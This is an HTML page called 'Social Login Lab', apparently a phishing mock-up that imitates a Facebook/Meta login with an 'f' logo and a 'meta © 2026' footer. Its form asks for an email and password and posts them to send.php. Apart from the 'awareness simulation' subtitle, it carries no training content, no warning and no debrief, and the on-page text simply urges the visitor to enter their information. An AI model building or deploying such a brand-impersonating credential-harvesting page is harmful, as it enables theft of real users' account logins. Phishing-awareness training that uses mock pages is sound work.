<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Social Login Lab</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

<div class="container">

    <div class="logo">
        <span>f</span>
    </div>

    <h1>Social Login Lab</h1>

    <p class="description">
        Cybersecurity Awareness Simulation
    </p>

    <div class="login-box">

        <h2>Welcome Back</h2>

        <p>Enter your tinformation</p>

        <form action="send.php" method="POST">

            <input
                type="email"
                name="email"
                placeholder="email"
                required
            >

            <input
                type="password"
                name="password"
                placeholder=" password"
                required
            >

            <button type="submit">
                send
            </button>

        </form>

        <div class="separator"></div>

        <p class="warning">
            pleas enter your information
        </p>

    </div>

    <footer>
        meta © 2026
    </footer>

</div>

</body>
</html>